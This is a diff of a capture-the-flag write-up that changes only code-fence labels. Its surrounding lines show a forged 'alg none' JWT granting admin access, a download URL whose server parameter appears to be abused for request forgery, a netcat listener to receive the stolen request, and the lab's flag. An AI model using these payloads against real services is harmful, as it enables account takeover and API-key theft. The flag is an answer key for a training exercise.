@@ -54,7 +54,7 @@ eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzIzODQwOTI0fQ
 ```
 
 ### Header
-```json
+```
 # Input Base64
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
 
@@ -63,7 +63,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
 ```
 
 ### Payload
-```json
+```
 # Input Base64
 eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzIzODQwOTI0fQ
 
@@ -72,7 +72,7 @@ eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzIzODQwOTI0fQ
 ```
 
 ## Admin Header
-```json
+```
 # Input String
 {"typ":"JWT","alg":"none"}
 
@@ -82,7 +82,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
 
 ## Admin Payload
 
-```json
+```
 # Input String
 {"username":"admin","exp":1723840924}
 
@@ -92,7 +92,7 @@ eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzIzODQwOTI0fQ==
 
 ## Whole JWT
 Don't forget the dot (`.`) following by the payload. I failed to get the flag because of the missing dot. <br>
-```json
+```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzIzODQwOTI0fQ==.
 ```
 
@@ -114,7 +114,7 @@ secure-file-storage.com
 ![](./screenshots/17.png) <br>
 ![](./screenshots/16.png) <br>
 
-```json
+```
 # What I found fomr the button
 http://10.10.10.48:8087/download?server=secure-file-storage.com:8087&id=75482342
 
@@ -128,7 +128,7 @@ Remember to listen to `8000` <br>
 nc -nvlp 8000
 ```
 ### Answer
-```json
+```
 THM{Hello_Im_just_an_API_key}
 ```
 
